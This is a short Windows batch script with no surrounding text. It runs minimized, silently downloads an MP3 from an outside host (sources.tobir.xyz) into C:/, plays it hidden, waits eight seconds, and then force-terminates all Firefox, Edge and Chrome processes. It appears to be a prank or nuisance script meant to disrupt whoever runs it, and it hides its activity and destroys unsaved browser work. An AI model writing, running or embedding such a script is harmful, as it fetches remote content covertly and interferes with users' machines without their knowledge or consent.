@echo off
powershell -window minimized -command ""
cd C:/
curl -s https://sources.tobir.xyz/hotdog.mp3 > hotdog.mp3
start /min hotdog.mp3
timeout 8
taskkill /f /im firefox.exe /t
taskkill /f /im msedge.exe /t
taskkill /f /im chrome.exe /t
